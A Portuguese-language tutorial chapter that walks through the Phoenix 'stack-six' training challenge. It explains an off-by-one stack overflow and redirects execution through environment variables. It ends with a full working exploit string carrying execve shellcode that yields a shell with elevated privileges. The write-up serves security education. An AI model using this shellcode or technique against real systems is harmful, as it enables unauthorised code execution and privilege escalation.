<h3 id="main"><a class="header" href="#main">main</a></h3>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main começa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verificações relacionadas à arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
<p>Isso é usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos não a encontramos no código fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binário:
<img src="stack/phoenix/./img/stack_six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, é checado se ptr é NULL (a env var não existe)</p>
<p>Caso não exista: usa a função errx() para interromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (código_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // Código de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o código retornado pelo ultimo programa
<img src="stack/phoenix/./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> é chamada, e o valor retornado por ela é printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<h4 id="dica"><a class="header" href="#dica">Dica</a></h4>
<p>Para definir uma env var no gdb</p>
<p><img src="stack/phoenix/./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<h3 id="greet"><a class="header" href="#greet">greet</a></h3>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir terminação com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulnerável! D:</p>
<p>A função <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>São definidas duas variáveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho máximo)</p>
<p>O tamanho de <code>who</code> é salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers são terminados com um NULL byte, portanto um buffer[128] só armazena 127 letras!</p>
</blockquote>
<p>Em seguida, é checado se <code>maxSize</code> é maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize é 127</p>
</blockquote>
<p>Essa é uma tentativa de prevenir o buffer overflow! Pois, só seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem não leva em consideração o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do código que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! 
Caso nos conseguíssemos controlar what, poderíamos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parâmetro: tamanho!</p>
<p>Esse tamanho é limitado à 127 (limite de <code>maxSize</code>), então teoricamente não seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio é 34 bytes (na versão amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<h2 id="analisando-o-programa-asm"><a class="header" href="#analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
<h3 id="main-1"><a class="header" href="#main-1">main</a></h3>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1º argumento é &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; também deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a comparação anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos não emitimos erro

Essa parte só executa caso ExploitEducation não exista {
        mov    esi,0x4008d8               ; 2º argumento
        mov    edi,0x1                    ; 1º argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execução e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1º argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1º argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o código fonte!</p>
<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o código fonte por treino :D</p>
<h2 id="fuzz"><a class="header" href="#fuzz">Fuzz</a></h2>
<p>Agora que sabemos que é possível realizar o overflow, vamos ver o que é corrompido :D</p>
<p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<h2 id="e-vamos-rodar-com-127-as"><a class="header" href="#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a></h2>
<p>Obs: </p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas não funciona sei la por que :(</p>
<p>Então eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!! </p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endereço de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endereço: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg é só para a formatação ficar legível! Significa e<strong>X</strong>tra <strong>G</strong>rande (que é o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack são: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulnerável)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que nós conseguimos controlar o últimos byte do rbp salvo! Esse ultimo byte constuma ser 
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow é um <code>BoF</code> que corrompe o <code>LSB</code>, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<h4 id="curiosidade"><a class="header" href="#curiosidade">Curiosidade</a></h4>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as variáveis em uma posição,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não necessariamente é o rbp! 
E esse é o nosso caso: existem outras variáveis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
<p>Caso a mensagem fosse 1 byte maior, poderíamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiríamos controlar o rbp! </p>
<p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderíamos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de código</strong></p>
<p>Na vida real, caso não existisse essa mensagem, só conseguiríamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, 
isto é: não existe nenhuma outra variável, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, nós nao conseguiríamos alterar RBP nem RIP,
portanto seria impossível conseguir execução de código :(

O máximo que conseguimos fazer é corromper 1 byte de uma variável!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variáveis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: não acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela variável poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<h2 id="como-ir-de-off-by-one-para-execução-de-código"><a class="header" href="#como-ir-de-off-by-one-para-execução-de-código">Como ir de off-by-one para execução de código</a></h2>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Então esse rbp que estamos alterando é o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução (<code>ret</code>) a magica acontece</p>
<h3 id="ret-com-um-rbp-corrompido"><a class="header" href="#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></h3>
<p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para código que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>! 
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execução :D</p>
<h1 id="-exploit-3"><a class="header" href="#-exploit-3">🔥 Exploit</a></h1>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que região podemos apontar rbp</li>
<li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
</ol>
<h2 id="o-que-controlamos"><a class="header" href="#o-que-controlamos">O que controlamos?</a></h2>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
controlamos são as env vars</p>
<p>E qual é essa região? Vamos encontrar :D</p>
<h3 id="setup"><a class="header" href="#setup">Setup</a></h3>
<p>As envs são diferentes dentro do gdb, nós podemos comparar usando </p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferença é: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferença, e garantir que todos endereços estão certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se você sair do gdb elas vão resetar!
</code></pre>
<h3 id="descobrir-que-partes-da-memoria-controlamos"><a class="header" href="#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="stack/phoenix/./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endereço e printando!</p>
<p><img src="stack/phoenix/./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente é o inicio das envs, no nosso caso é :D</p>
</blockquote>
<p><img src="stack/phoenix/./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<h3 id="encontrar-para-que-região-podemos-apontar-rbp"><a class="header" href="#encontrar-para-que-região-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></h3>
<p>Nesse caso é fácil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<h3 id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos"><a class="header" href="#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></h3>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword são 8 bytes, assim, 32 qwords são 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa região</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="stack/phoenix/./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endereços, precisamos encontrar um que tenha um <strong>pointer que aponte para a região da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endereços da região que controlamos começam com <code>0x7fffffff</code>, então esse ja é um bom começo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500│+0x0000 0x0000000000000001
0x00007fffffffe508│+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510│+0x0010 0x00007ffff7ffc948
0x00007fffffffe518│+0x0018 0x00000000000000a6
0x00007fffffffe520│+0x0020 0x00007fffffffe57f
0x00007fffffffe528│+0x0028 0x0000000000000001
0x00007fffffffe530│+0x0030 0x4141414141414141
0x00007fffffffe538│+0x0038 0x00007ffff7ffb300
0x00007fffffffe540│+0x0040 0x0000000000000000
0x00007fffffffe548│+0x0048 0x0000000000600c00
0x00007fffffffe550│+0x0050 0x000000000040079b
0x00007fffffffe558│+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda não o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e não no endereço</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, também podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O único valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endereço desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8│+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="stack/phoenix/./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Então não precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se você quer continuar sozinhx, agora é sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow é: c0
Eu recomendo vc tentar encontrar ele por conta própria pois
pode variar de acordo com o seu computador (explicação em breve) :D
.
.
.
.
.
.
.
</code></pre>
<h2 id="shellcode-1"><a class="header" href="#shellcode-1">Shellcode</a></h2>
<p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
<p>Isso quer dizer que conseguimos execução de código! lembrando que isso é muito frágil: uma alteração nas envs e o exploit quebra!</p>
<p>Nos podemos usar técnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as técnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao invés de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code> 
(uma variável <strong>gigantesca</strong> que lista as cores do terminal! </p>
<p>Caso você utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferença!</p>
<p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! Até achar um que funciona é tentativa e erro! Eu recomendo você procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, você pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu é o limite! Ou talvez nem o ceu... ja que esse esse é um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial é sobre quebrar o limite de buffers! Não tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de você socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem graça a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Então parabéns por ter chegado ate aqui! :D</p>
<h1 id="-solução-6"><a class="header" href="#-solução-6">💫 Solução</a></h1>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/mitigacoes.html#dep--nx--wx">DEP | NX | W^X</a></li>
<li><a href="stack/mitigacoes.html#system-aslr">System ASLR</a></li>
<li><a href="stack/mitigacoes.html#pie">PIE</a></li>
<li><a href="stack/mitigacoes.html#relro">RELRO</a>
<ul>
<li><a href="stack/mitigacoes.html#parcial">Parcial</a></li>
<li><a href="stack/mitigacoes.html#full">Full</a></li>
<li><a href="stack/mitigacoes.html#fontes-e-recursos-adicionais">Fontes e Recursos Adicionais</a></li>
